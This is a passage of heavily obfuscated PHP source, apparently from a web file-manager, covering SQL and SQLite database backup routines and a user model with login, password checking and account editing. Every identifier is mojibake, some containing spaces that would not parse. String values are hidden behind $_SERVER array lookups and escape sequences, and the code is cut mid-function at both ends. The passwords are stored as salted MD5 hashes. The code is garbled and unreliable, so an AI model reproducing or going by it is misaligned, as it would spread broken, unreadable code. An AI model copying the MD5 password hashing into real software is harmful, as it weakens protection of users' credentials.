cöΩ¶õû≠Ï; eÁ¬∫πÜﬂî: } public function makeSqlFile($fóçŒËÓßû, $bÔœ÷ƒ´¯”, $a›≠‚œ˘ï¿, $Dß“é‡í”⁄) { goto a—º÷¢ƒÔ¶; bÕ§ÆóèäÈ: $CÊòÚåÊ›œ = 2000; $dÙ◊ˆÛüÆ = fopen($bÔœ÷ƒ´¯”, $_SERVER[£¿ÌÙëü¡¯¯][707]); $DÀπÌ¶—áÉ = Model($fóçŒËÓßû)->getPk(); goto a¨´·¥◊Óä; Eã∑ÔÉÃçë: return $dÙ¿ìõÓ–Ô; goto B€üÿâ©º˜; a—º÷¢ƒÔ¶: $EÿÆäÊÃ€∞ = self::$io; $dÙ¿ìõÓ–Ô = 0; $dﬁ–‰√‡∏¢ = 1; goto bÕ§ÆóèäÈ; a¨´·¥◊Óä: $CÊÀ€ß¿‚ó = Model($fóçŒËÓßû)->getDbFields(); do { $f°Êﬂó—ìÉ = Model($fóçŒËÓßû)->field($CÊÀ€ß¿‚ó)->order($DÀπÌ¶—áÉ . $_SERVER[£¿ÌÙëü¡¯¯][708])->selectPage($CÊòÚåÊ›œ, $dﬁ–‰√‡∏¢); $BóéûÍ≈âã = !empty($f°Êﬂó—ìÉ[$_SERVER[£¿ÌÙëü¡¯¯][350]]) ? $f°Êﬂó—ìÉ[$_SERVER[£¿ÌÙëü¡¯¯][350]] : array(); $F¢ Âæï”∏ = array(); foreach ($BóéûÍ≈âã as $Bıœêõ©º±) { if ($fóçŒËÓßû == $_SERVER[£¿ÌÙëü¡¯¯][709] && (!isset($Dß“é‡í”⁄[$_SERVER[£¿ÌÙëü¡¯¯][679]]) || $Dß“é‡í”⁄[$_SERVER[£¿ÌÙëü¡¯¯][679]] == $_SERVER[£¿ÌÙëü¡¯¯][464])) { $Bıœêõ©º±[$_SERVER[£¿ÌÙëü¡¯¯][76]] = "\x7b\x69\x6f\72{$EÿÆäÊÃ€∞}\x7d" . substr($Bıœêõ©º±[$_SERVER[£¿ÌÙëü¡¯¯][76]], strlen("\x7b\151\157\x3a{$Bıœêõ©º±[$_SERVER[£¿ÌÙëü¡¯¯][710]]}\x7d")); $Bıœêõ©º±[$_SERVER[£¿ÌÙëü¡¯¯][710]] = $EÿÆäÊÃ€∞; } $F¢ Âæï”∏[] = $_SERVER[£¿ÌÙëü¡¯¯][711] . $this->addSqlSlashes($Bıœêõ©º±) . $_SERVER[£¿ÌÙëü¡¯¯][712]; } if ($C´Æ∂¬˘˘π = count($BóéûÍ≈âã)) { $bÈé€Ó∆› = "\111\x4e\123\x45\x52\x54\40\x49\x4e\x54\x4f\40\x60{$fóçŒËÓßû}\140\x20\50\140" . implode($_SERVER[£¿ÌÙëü¡¯¯][713], $CÊÀ€ß¿‚ó) . $_SERVER[£¿ÌÙëü¡¯¯][714]; fwrite($dÙ◊ˆÛüÆ, $bÈé€Ó∆› . implode($_SERVER[£¿ÌÙëü¡¯¯][715], $F¢ Âæï”∏) . $_SERVER[£¿ÌÙëü¡¯¯][68] . PHP_EOL); $a›≠‚œ˘ï¿->update($C´Æ∂¬˘˘π); } $dﬁ–‰√‡∏¢++; $dÙ¿ìõÓ–Ô += $C´Æ∂¬˘˘π; } while ($C´Æ∂¬˘˘π == $CÊòÚåÊ›œ); fclose($dÙ◊ˆÛüÆ); goto Eã∑ÔÉÃçë; B€üÿâ©º˜: } private function addSqlSlashes($A◊ãüµà±Ç) { $Bá•±ŒÛáƒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $CúÇÈéäó– = array(); foreach ($A◊ãüµà±Ç as $C◊°ÚÌÕ€Ú) { if (is_array($C◊°ÚÌÕ€Ú)) { $C◊°ÚÌÕ€Ú = json_encode_force($C◊°ÚÌÕ€Ú); } $C◊°ÚÌÕ€Ú = addslashes($C◊°ÚÌÕ€Ú); $C◊°ÚÌÕ€Ú = str_replace(array($Bá•±ŒÛáƒ[716], $Bá•±ŒÛáƒ[214]), array($Bá•±ŒÛáƒ[717], $Bá•±ŒÛáƒ[718]), $C◊°ÚÌÕ€Ú); $CúÇÈéäó–[] = $C◊°ÚÌÕ€Ú; } return $Bá•±ŒÛáƒ[55] . implode($Bá•±ŒÛáƒ[719], $CúÇÈéäó–) . $Bá•±ŒÛáƒ[55]; } private function sqliteFile() { $F†ˆ¥Ï©” =& $_SERVER[£¿ÌÙëü¡¯¯]; $bΩª¯⁄ä‰˜ = null; $bëêÂıƒÒ¶ = $GLOBALS[$F†ˆ¥Ï©”[6]][$F†ˆ¥Ï©”[17]]; if ($bëêÂıƒÒ¶[$F†ˆ¥Ï©”[720]] == $F†ˆ¥Ï©”[721]) { $AÜÎ∆ß´øô = explode($F†ˆ¥Ï©”[722], $bëêÂıƒÒ¶[$F†ˆ¥Ï©”[723]]); if (substr($AÜÎ∆ß´øô[0], 0, 6) == $F†ˆ¥Ï©”[9]) { $bΩª¯⁄ä‰˜ = $AÜÎ∆ß´øô[1]; } } else { if (substr($bëêÂıƒÒ¶[$F†ˆ¥Ï©”[720]], 0, 6) == $F†ˆ¥Ï©”[9]) { $bΩª¯⁄ä‰˜ = $bëêÂıƒÒ¶[$F†ˆ¥Ï©”[231]]; } } return $bΩª¯⁄ä‰˜; } public function sqliteBackup($EÑ£ŒæÁ¿†) { goto E÷≈ø¯–ÓÙ; bÁ´ÙóÎ¥‚: $dä§¥∆À¿ﬁ->end(); $f¬ÿ•‹±Ò‘ = array($A≠ÕõóáÕ‰[694] => 1, $A≠ÕõóáÕ‰[706] => 1, $A≠ÕõóáÕ‰[695] => 1, $A≠ÕõóáÕ‰[730] => $BÁÖíôåøÃ); Backup::set($f¬ÿ•‹±Ò‘); goto aíÉÀ‡ıø°; DÇô‰÷†ŒÖ: $f¬ÿ•‹±Ò‘ = array($A≠ÕõóáÕ‰[702] => $A≠ÕõóáÕ‰[9], $A≠ÕõóáÕ‰[704] => 1, $A≠ÕõóáÕ‰[726] => $BÁÖíôåøÃ); Backup::set($f¬ÿ•‹±Ò‘); $dä§¥∆À¿ﬁ = new TaskFileTransfer($A≠ÕõóáÕ‰[727], $A≠ÕõóáÕ‰[698], 1, LNG($A≠ÕõóáÕ‰[699]) . $A≠ÕõóáÕ‰[408] . LNG($A≠ÕõóáÕ‰[701]) . $A≠ÕõóáÕ‰[728]); goto Bíê‹•„Éô; B∞ıîøÑè“: $c¥‰’èÎÏ‹ = "\x7b\151\157\x3a{$eØ∫‡¨Úñ“}\x7d\x2f\144\141\164\141\142\141\x73\x65\x2f\x62\x61\x63\153\165\x70\137" . self::$name . $A≠ÕõóáÕ‰[725]; if (!IO::exist($c¥‰’èÎÏ‹)) { IO::mkdir($c¥‰’èÎÏ‹); } $BÁÖíôåøÃ = IO::size($EÑ£ŒæÁ¿†); goto DÇô‰÷†ŒÖ; aíÉÀ‡ıø°: return !1; goto c¢ä≤ìÑõœ; E÷≈ø¯–ÓÙ: $A≠ÕõóáÕ‰ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eØ∫‡¨Úñ“ = self::$io; $d¶òû≠¿»Û = CONTROLLER_DIR . $A≠ÕõóáÕ‰[724]; goto B∞ıîøÑè“; Bíê‹•„Éô: $dä§¥∆À¿ﬁ->task[$A≠ÕõóáÕ‰[685]] = $BÁÖíôåøÃ; IO::copy($d¶òû≠¿»Û . $A≠ÕõóáÕ‰[729], $c¥‰’èÎÏ‹); IO::copy($EÑ£ŒæÁ¿†, $c¥‰’èÎÏ‹); goto bÁ´ÙóÎ¥‚; c¢ä≤ìÑõœ: } } class BackupDbFile { public function __construct() { } public function index() { goto bÎ∆û“ÍÍƒ; d¡˘ÚãìÓ§: Backup::set(array($DúˆëéÔ√ä[726] => $Bí¶¬”–ë›[$DúˆëéÔ√ä[78]])); IO::move($FÇÿÇ∫ôæÇ, $dåÑÙÔ¿–¶); $A‘“àÆò÷ò = CONTROLLER_DIR . $DúˆëéÔ√ä[731]; goto b√ÿßìû„ß; b√ÿßìû„ß: IO::copy($A‘“àÆò÷ò, $dåÑÙÔ¿–¶ . "\142\141\143\153\x75\x70\137{$F˜‘Á∫ÁÜ¨}\x2f"); $BË„Úßå∏ª->end(); Backup::set(array($DúˆëéÔ√ä[730] => $Bí¶¬”–ë›[$DúˆëéÔ√ä[78]])); goto b≠Œì«Æ›ú; e¯™±ö√ûÑ: $BË„Úßå∏ª = new TaskFileTransfer($DúˆëéÔ√ä[727], $DúˆëéÔ√ä[698], 0, LNG($DúˆëéÔ√ä[699]) . $DúˆëéÔ√ä[408] . LNG($DúˆëéÔ√ä[701]) . $DúˆëéÔ√ä[728]); $BË„Úßå∏ª->addPath($FÇÿÇ∫ôæÇ); $Bí¶¬”–ë› = IO::infoWithChildren($FÇÿÇ∫ôæÇ); goto d¡˘ÚãìÓ§; CÎ¨£›¶«Ö: $FÇÿÇ∫ôæÇ = TEMP_FILES . "\142\141\143\153\165\160\137{$F˜‘Á∫ÁÜ¨}\57"; $dåÑÙÔ¿–¶ = "\173\151\x6f\x3a{$c©„ˆ©¡¡®[$DúˆëéÔ√ä[678]]}\x7d\x2f\x64\x61\164\x61\142\x61\x73\145\x2f"; IO::mkdir($dåÑÙÔ¿–¶ . "\142\141\143\x6b\165\x70\137{$F˜‘Á∫ÁÜ¨}\57"); goto e¯™±ö√ûÑ; b≠Œì«Æ›ú: return !0; goto Aêã¥Öòëı; bÎ∆û“ÍÍƒ: $DúˆëéÔ√ä =& $_SERVER[£¿ÌÙëü¡¯¯]; $c©„ˆ©¡¡® = Backup::get(); $F˜‘Á∫ÁÜ¨ = $c©„ˆ©¡¡®[$DúˆëéÔ√ä[28]]; goto CÎ¨£›¶«Ö; Aêã¥Öòëı: } } goto C¥Ï˜úœ® ; FΩâŸÀÇ›Ö: class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\x61\x6d\x65" => "\165\163\145\162\x5f\x6d\145\x74\x61", "\155\x65\164\x61\106\x69\x65\154\x64" => "\165\163\145\162\111\x44"); protected $simpleField = "\x75\163\x65\162\x49\x44\x2c\x6e\x69\143\x6b\x4e\x61\155\145\x2c\156\141\x6d\145\x2c\141\166\x61\x74\141\x72\54\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($a∑°‰÷òäÖ) { $bÌ¶º§¨«â =& $_SERVER[£¿ÌÙëü¡¯¯]; return array($bÌ¶º§¨«â[2080] => array($a∑°‰÷òäÖ[0], $bÌ¶º§¨«â[2372]), $bÌ¶º§¨«â[2082] => array($a∑°‰÷òäÖ[0], $bÌ¶º§¨«â[2372])); } protected function getInfo($cﬂåÌ≠◊ÖÃ, $fµ∏‘áùîç = false) { $cÒàò»úõª =& $_SERVER[£¿ÌÙëü¡¯¯]; $c™ŸΩÑüª° = $this->getInfoSimple($cﬂåÌ≠◊ÖÃ); if (!is_array($c™ŸΩÑüª°)) { return array(); } if ($fµ∏‘áùîç) { goto bÊ≥¬À°§√; aåﬂœúÖ«º: return $c™ŸΩÑüª°; goto EÜ‘œ–ç¥à; dÉ†›ÙÀÏ£: $Cßëπûª◊ñ = Model($cÒàò»úõª[1084])->metaGet($c™ŸΩÑüª°[$cÒàò»úõª[388]][$cÒàò»úõª[366]]); $c™ŸΩÑüª°[$cÒàò»úõª[2375]] = $FÜ≠√ÉôòÑ; $c™ŸΩÑüª°[$cÒàò»úõª[388]][$cÒàò»úõª[2228]] = isset($Cßëπûª◊ñ[$cÒàò»úõª[2229]]) ? $Cßëπûª◊ñ[$cÒàò»úõª[2229]] : null; goto aåﬂœúÖ«º; bÊ≥¬À°§√: if (!$c™ŸΩÑüª°) { return $c™ŸΩÑüª°; } $FÜ≠√ÉôòÑ = md5($cÒàò»úõª[2373] . $c™ŸΩÑüª°[$cÒàò»úõª[799]] . $cÒàò»úõª[2374] . $c™ŸΩÑüª°[$cÒàò»úõª[28]]); $c™ŸΩÑüª° = $this->_listDataApplyItem($c™ŸΩÑüª°); goto dÉ†›ÙÀÏ£; EÜ‘œ–ç¥à: } return $this->cacheFunctionGet($cÒàò»úõª[2123], $cﬂåÌ≠◊ÖÃ); } protected function getInfoSimple($C°ÂÀ∆Ê‘—, $Eîõ„Î¶¥Ì = false) { $c“™ê¢´≤ı =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$C°ÂÀ∆Ê‘—) { return array(); } if ($Eîõ„Î¶¥Ì) { $Céùÿ∞ÖÌÇ = $this->where(array($c“™ê¢´≤ı[1349] => intval($C°ÂÀ∆Ê‘—)))->find(); if (!is_array($Céùÿ∞ÖÌÇ)) { return array(); } $Céùÿ∞ÖÌÇ[$c“™ê¢´≤ı[2376]] = Action($c“™ê¢´≤ı[2377])->parseUrl($Céùÿ∞ÖÌÇ[$c“™ê¢´≤ı[2376]]); return $Céùÿ∞ÖÌÇ; } return $this->cacheFunctionGet($c“™ê¢´≤ı[2083], $C°ÂÀ∆Ê‘—); } protected function getInfoSimpleOuter($Fá—ﬁ›•œ„) { goto Aâá∆÷œπè; BçàŸ∑«àÂ: return $e∆¥∞öèî’; goto d˘ÛãÓÜ⁄—; B÷ïÖüÆŒß: $e∆¥∞öèî’ = array_field_key($cõ‘≥∆ÜÁ‚, explode($bˆŒ‘ﬁö––[47], $this->simpleField)); if (!$e∆¥∞öèî’) { return array($bˆŒ‘ﬁö––[1349] => $bˆŒ‘ﬁö––[1006], $bˆŒ‘ﬁö––[28] => $bˆŒ‘ﬁö––[154] . LNG($bˆŒ‘ﬁö––[2380]) . $bˆŒ‘ﬁö––[468], $bˆŒ‘ﬁö––[2376] => STATIC_PATH . $bˆŒ‘ﬁö––[2381]); } $e∆¥∞öèî’[$bˆŒ‘ﬁö––[2376]] = Action($bˆŒ‘ﬁö––[2377])->parseUrl($e∆¥∞öèî’[$bˆŒ‘ﬁö––[2376]]); goto BçàŸ∑«àÂ; Aâá∆÷œπè: $bˆŒ‘ﬁö–– =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$Fá—ﬁ›•œ„ || $Fá—ﬁ›•œ„ == 0) { return array($bˆŒ‘ﬁö––[1349] => $bˆŒ‘ﬁö––[464], $bˆŒ‘ﬁö––[28] => $bˆŒ‘ﬁö––[154] . LNG($bˆŒ‘ﬁö––[2378]) . $bˆŒ‘ﬁö––[468], $bˆŒ‘ﬁö––[2376] => STATIC_PATH . $bˆŒ‘ﬁö––[2379]); } $cõ‘≥∆ÜÁ‚ = $this->cacheFunctionGet($bˆŒ‘ﬁö––[2083], $Fá—ﬁ›•œ„); goto B÷ïÖüÆŒß; d˘ÛãÓÜ⁄—: } protected function groupUser($eê•ÆÒõç“) { } public static function errorLang($f»ó’Àæû¯) { $cùñÿÈÈ÷è =& $_SERVER[£¿ÌÙëü¡¯¯]; $A›◊õ€πÔù = array(self::ERROR_USER_NOT_EXISTS => $cùñÿÈÈ÷è[2382], self::ERROR_USER_PASSWORD_ERROR => $cùñÿÈÈ÷è[2383], self::ERROR_USER_EXIST_NAME => $cùñÿÈÈ÷è[2384], self::ERROR_USER_EXIST_PHONE => $cùñÿÈÈ÷è[2385], self::ERROR_USER_EXIST_EMAIL => $cùñÿÈÈ÷è[2386], self::ERROR_USER_LOGIN_LOCK => $cùñÿÈÈ÷è[2387], self::ERROR_IP_NOT_ALLOW => $cùñÿÈÈ÷è[2388], self::ERROR_USER_EXIST_NICKNAME => $cùñÿÈÈ÷è[2389]); return LNG($A›◊õ€πÔù[$f»ó’Àæû¯]); } public function getInfoByMeta($aÿ∞üÂ√Ú¬, $eâÛÁ⁄ØãΩ) { $EºÓüòß¯˘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B£Ù≤ÆÏãΩ = Model($EºÓüòß¯˘[2390])->where(array($EºÓüòß¯˘[90] => $aÿ∞üÂ√Ú¬, $EºÓüòß¯˘[354] => $eâÛÁ⁄ØãΩ))->find(); if ($B£Ù≤ÆÏãΩ) { return $this->getInfo($B£Ù≤ÆÏãΩ[$EºÓüòß¯˘[1349]]); } return !1; } public function userLoginCheck($B«üÑíõ€ˆ, $BÑΩºÏ´¬Ó) { goto a»ÜÓÜö¶Û; a»ÜÓÜö¶Û: $fëÇ’øïÆ÷ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fèº®À¶Ïõ = array($fëÇ’øïÆ÷[28] => $B«üÑíõ€ˆ, $fëÇ’øïÆ÷[2231] => $B«üÑíõ€ˆ, $fëÇ’øïÆ÷[290] => $B«üÑíõ€ˆ, $fëÇ’øïÆ÷[2391] => $B«üÑíõ€ˆ, $fëÇ’øïÆ÷[912] => $fëÇ’øïÆ÷[914]); if ($this->nickNameRpt()) { unset($fèº®À¶Ïõ[$fëÇ’øïÆ÷[2231]]); } goto FÇŸœÎ±Ê; cäÂ∞Ø∫úÑ: $this->userEdit($f’ëã∑±º’[$fëÇ’øïÆ÷[1349]], array($fëÇ’øïÆ÷[2392] => time())); $this->clearCache($f’ëã∑±º’[$fëÇ’øïÆ÷[1349]]); return $this->getInfo($f’ëã∑±º’[$fëÇ’øïÆ÷[1349]]); goto fã√«ÍËºé; FÇŸœÎ±Ê: $f’ëã∑±º’ = $this->where($fèº®À¶Ïõ)->find(); if (!$f’ëã∑±º’) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($f’ëã∑±º’[$fëÇ’øïÆ÷[1349]], $BÑΩºÏ´¬Ó)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto cäÂ∞Ø∫úÑ; fã√«ÍËºé: } public function clearCache($AíŸÜåÀ»ô) { $C⁄Áè¨“ù‘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->cacheFunctionClear($C⁄Áè¨“ù‘[2123], $AíŸÜåÀ»ô); $this->cacheFunctionClear($C⁄Áè¨“ù‘[2083], $AíŸÜåÀ»ô); } public function userPasswordCheck($bâè◊¢äéﬁ, $dÍê„áÌµı) { $bÂëèÚÉ¥Ú =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÂ„Ö¡˜Ì¥ = $this->where(array($bÂëèÚÉ¥Ú[1349] => intval($bâè◊¢äéﬁ)))->find(); $CÎïƒ“È†® = $this->metaGet($bâè◊¢äéﬁ); $f∂å–ÿ‡“≤ = isset($CÎïƒ“È†®[$bÂëèÚÉ¥Ú[2393]]) ? $CÎïƒ“È†®[$bÂëèÚÉ¥Ú[2393]] : $bÂëèÚÉ¥Ú[33]; if (md5($f∂å–ÿ‡“≤ . trim($dÍê„áÌµı)) !== $dÂ„Ö¡˜Ì¥[$bÂëèÚÉ¥Ú[799]]) { return !1; } return !0; } public function userAdd($BÆ”ŸØÑﬁı) { goto EíÒÒæ∏Ü∫; a„⁄ºŒ÷≠: $DÇåÆ‰á€ï = $this->_checkExist($BÆ”ŸØÑﬁı); if ($DÇåÆ‰á€ï !== !0) { return $DÇåÆ‰á€ï; } $e˘Œ¬ﬁ¯áç = $this->add($cÊ∆“ªÿâÇ); goto d”‚îÀÆ¬›; AÉ®ñ≥Ω–®: return $e˘Œ¬ﬁ¯áç; goto b¥¥≠¶¨ÖØ; EíÒÒæ∏Ü∫: $fË⁄ƒ◊”óã =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÊ∆“ªÿâÇ = array($fË⁄ƒ◊”óã[383] => $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[28]], $fË⁄ƒ◊”óã[2394] => $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[2395]], $fË⁄ƒ◊”óã[2396] => isset($BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[290]]) ? $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[290]] : $fË⁄ƒ◊”óã[33], $fË⁄ƒ◊”óã[2397] => isset($BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[2391]]) ? $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[2391]] : $fË⁄ƒ◊”óã[33], $fË⁄ƒ◊”óã[2398] => isset($BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[2231]]) ? $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[2231]] : $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[28]], $fË⁄ƒ◊”óã[2399] => isset($BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[2376]]) ? $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[2376]] : $fË⁄ƒ◊”óã[33], $fË⁄ƒ◊”óã[2400] => isset($BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[2401]]) ? $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[2401]] : 1, $fË⁄ƒ◊”óã[2402] => $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[799]], $fË⁄ƒ◊”óã[2085] => isset($BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[1997]]) ? $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[1997]] : 1024 * 1024 * 20, $fË⁄ƒ◊”óã[2086] => 0, $fË⁄ƒ◊”óã[2392] => 0, $fË⁄ƒ◊”óã[2110] => isset($BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[676]]) ? $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[676]] : 1); if (!empty($BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[1349]])) { $cÊ∆“ªÿâÇ[$fË⁄ƒ◊”óã[1349]] = $BÆ”ŸØÑﬁı[$fË⁄ƒ◊”óã[1349]]; } goto a„⁄ºŒ÷≠; d”‚îÀÆ¬›: $eüÑ¡„Àíº = array($fË⁄ƒ◊”óã[2402] => $cÊ∆“ªÿâÇ[$fË⁄ƒ◊”óã[799]], $fË⁄ƒ◊”óã[2398] => $cÊ∆“ªÿâÇ[$fË⁄ƒ◊”óã[2231]]); $this->userEdit($e˘Œ¬ﬁ¯áç, $eüÑ¡„Àíº); Model($fË⁄ƒ◊”óã[1084])->userRootAdd($e˘Œ¬ﬁ¯áç); goto AÉ®ñ≥Ω–®; b¥¥≠¶¨ÖØ: } protected function userEditTest($DäêÌ∏œˆ , $Cé¢ï‡∏¥Ú) { return $this->call($_SERVER[£¿ÌÙëü¡¯¯][2403], $DäêÌ∏œˆ , $Cé¢ï‡∏¥Ú); } protected function userEdit($Dæ€¯öäŸ≠, $fí«¨µÇ¢) { goto Dâ˜àƒÇ º; a™êÃê∆ïÃ: $this->where(array($eÙè∆ﬂπ∞„[1340] => $Dæ€¯öäŸ≠))->save($fí«¨µÇ¢); if (isset($fí«¨µÇ¢[$eÙè∆ﬂπ∞„[2231]])) { $this->setNamePinyin($Dæ€¯öäŸ≠, $fí«¨µÇ¢[$eÙè∆ﬂπ∞„[2231]]); } return !0; goto dœ€‚ã‡´Ì; Dâ˜àƒÇ º: $eÙè∆ﬂπ∞„ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eõÃÛØ›¶ë = $this->getInfoSimple($Dæ€¯öäŸ≠); if (!$eõÃÛØ›¶ë) { return !1; } goto B¢∫ˆäËÜô; B¢∫ˆäËÜô: $B¡»òáΩúæ = $this->_checkExist($fí«¨µÇ¢, $Dæ€¯öäŸ≠); if ($B¡»òáΩúæ !== !0) { return $B¡»òáΩúæ; } if (isset($fí«¨µÇ¢[$eÙè∆ﬂπ∞„[799]]) && trim($fí«¨µÇ¢[$eÙè∆ﬂπ∞„[799]]) != $eÙè∆ﬂπ∞„[33]) { $bà∞°˘√ﬁ… = $this->metaGet($Dæ€¯öäŸ≠); if (empty($bà∞°˘√ﬁ…[$eÙè∆ﬂπ∞„[2393]])) { $bà∞°˘√ﬁ…[$eÙè∆ﬂπ∞„[2393]] = rand_string(10); Model($eÙè∆ﬂπ∞„[466])->metaSet($Dæ€¯öäŸ≠, $eÙè∆ﬂπ∞„[2393], $bà∞°˘√ﬁ…[$eÙè∆ﬂπ∞„[2393]]); } $fí«¨µÇ¢[$eÙè∆ﬂπ∞„[799]] = md5($bà∞°˘√ﬁ…[$eÙè∆ﬂπ∞„[2393]] . trim($fí«¨µÇ¢[$eÙè∆ﬂπ∞„[799]])); } else { unset($fí«¨µÇ¢[$eÙè∆ﬂπ∞„[799]]); } goto a™êÃê∆ïÃ; dœ€‚ã‡´Ì: } public function setNamePinyin($fúœ∆∂óØà, $bê‚Çè◊ùÊ = false) { $dîßéùÈ∆⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$bê‚Çè◊ùÊ) { $E‡ıö¥‰ˆ€ = $this->getInfoSimple($fúœ∆∂óØà); $bê‚Çè◊ùÊ = $E‡ıö¥‰ˆ€[$dîßéùÈ∆⁄[2231]] ? $E‡ıö¥‰ˆ€[$dîßéùÈ∆⁄[2231]] : $E‡ıö¥‰ˆ€[$dîßéùÈ∆⁄[28]]; } $f˜ÚÍô¬ù“ = Model($dîßéùÈ∆⁄[469]); if (!Input::check($bê‚Çè◊ùÊ, $dîßéùÈ∆⁄[520])) { return $f˜ÚÍô¬ù“->metaSet($fúœ∆∂óØà, array($dîßéùÈ∆⁄[412] => $dîßéùÈ∆⁄[33], $dîßéùÈ∆⁄[411] => $dîßéùÈ∆⁄[33])); } return $f˜ÚÍô¬ù“->metaSet($fúœ∆∂óØà, array($dîßéùÈ∆⁄[412] => str_replace($dîßéùÈ∆⁄[50], $dîßéùÈ∆⁄[33], Pinyin::encode($bê‚Çè◊ùÊ)), $dîßéùÈ∆⁄[411] => Pinyin::encode($bê‚Çè◊ùÊ, $dîßéùÈ∆⁄[521]))); } private function nickNameRpt() { $C–∏§òŸÿø =& $_SERVER[£¿ÌÙëü¡¯¯]; $D‰˜∆»É…© = Model($C–∏§òŸÿø[1062])->get($C–∏§òŸÿø[2404]); $C÷Î›¥Ê≥˜ = $GLOBALS[$C–∏§òŸÿø[6]][$C–∏§òŸÿø[2361]][$C–∏§òŸÿø[2404]]; $F◊ºí”ÍÔ’ = !is_null($D‰˜∆»É…©) ? $D‰˜∆»É…© : $C÷Î›¥Ê≥˜; return !!$F◊ºí”ÍÔ’; } private function _checkExist($bÙÒÑ®ÔÙµ, $f“◊ƒ°™Æ€ = false) { $aõ§ôì—÷ì =& $_SERVER[£¿ÌÙëü¡¯¯]; $C¥√⁄ÇüúÉ = array($aõ§ôì—÷ì[28] => UserModel::ERROR_USER_EXIST_NAME, $aõ§ôì—÷ì[2231] => UserModel::ERROR_USER_EXIST_NICKNAME, $aõ§ôì—÷ì[290] => UserModel::ERROR_USER_EXIST_EMAIL, $aõ§ôì—÷ì[2391] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($C¥√⁄ÇüúÉ[$aõ§ôì—÷ì[2231]]); } $C∫—ı’Ÿ™£ = $f“◊ƒ°™Æ€ ? array($aõ§ôì—÷ì[1349] => array($aõ§ôì—÷ì[2405], $f“◊ƒ°™Æ€)) : array(); foreach ($C¥√⁄ÇüúÉ as $Aâë≈ùÏ…£ => $Aåü’¿ù˜á) { if (!isset($bÙÒÑ®ÔÙµ[$Aâë≈ùÏ…£]) || !$bÙÒÑ®ÔÙµ[$Aâë≈ùÏ…£]) { continue; } $FäÎ«∆´“ﬁ = array_merge(array($Aâë≈ùÏ…£ => $bÙÒÑ®ÔÙµ[$Aâë≈ùÏ…£]), $C∫—ı’Ÿ™£); $EÖ≥ÇıàïË = $this->where($FäÎ«∆´“ﬁ)->find(); if ($EÖ≥ÇıàïË) { return $Aåü’¿ù˜á; } } return !0; } public function userListInfo($a¡ïÑªÛÒ·) { $Eïàﬁ©áøÚ =& $_SERVER[£¿ÌÙëü¡¯¯]; $DâÑà”ßÁè = array(); $a¡ïÑªÛÒ· = array_unique($a¡ïÑªÛÒ·); if (!$a¡ïÑªÛÒ·) { return $DâÑà”ßÁè; } if (count($a¡ïÑªÛÒ·) < 20) { foreach ($a¡ïÑªÛÒ· as $a°ÆáÈ€ Ç) { $DâÑà”ßÁè[$a°ÆáÈ€ Ç . $Eïàﬁ©áøÚ[33]] = $this->getInfoSimpleOuter($a°ÆáÈ€ Ç); } } else { $cœá∆»Ñ≈¥ = array($Eïàﬁ©áøÚ[1340] => array($Eïàﬁ©áøÚ[381], $a¡ïÑªÛÒ·)); if (count($a¡ïÑªÛÒ·) == 1) { $cœá∆»Ñ≈¥ = array($Eïàﬁ©áøÚ[1340] => $a¡ïÑªÛÒ·[0]); } $FÇõ—ﬂ⁄˜Ü = Model($Eïàﬁ©áøÚ[466])->field($this->simpleField)->where($cœá∆»Ñ≈¥)->select(); $FÇõ—ﬂ⁄˜Ü = array_to_keyvalue($FÇõ—ﬂ⁄˜Ü, $Eïàﬁ©áøÚ[1349]); foreach ($a¡ïÑªÛÒ· as $a°ÆáÈ€ Ç) { $cÇªÉ©¥Á = $FÇõ—ﬂ⁄˜Ü[$FÇõ—ﬂ⁄˜Ü[$a°ÆáÈ€ Ç]]; if (!$cÇªÉ©¥Á) { $DâÑà”ßÁè[$a°ÆáÈ€ Ç . $Eïàﬁ©áøÚ[33]] = $this->getInfoSimpleOuter($a°ÆáÈ€ Ç); continue; } $cÇªÉ©¥Á[$Eïàﬁ©áøÚ[2376]] = Action($Eïàﬁ©áøÚ[2377])->parseUrl($cÇªÉ©¥Á[$Eïàﬁ©áøÚ[2376]]); $DâÑà”ßÁè[$a°ÆáÈ€ Ç . $Eïàﬁ©áøÚ[33]] = $cÇªÉ©¥Á; } } return $DâÑà”ßÁè; } protected function userStatus($eæÛÓÒΩåœ, 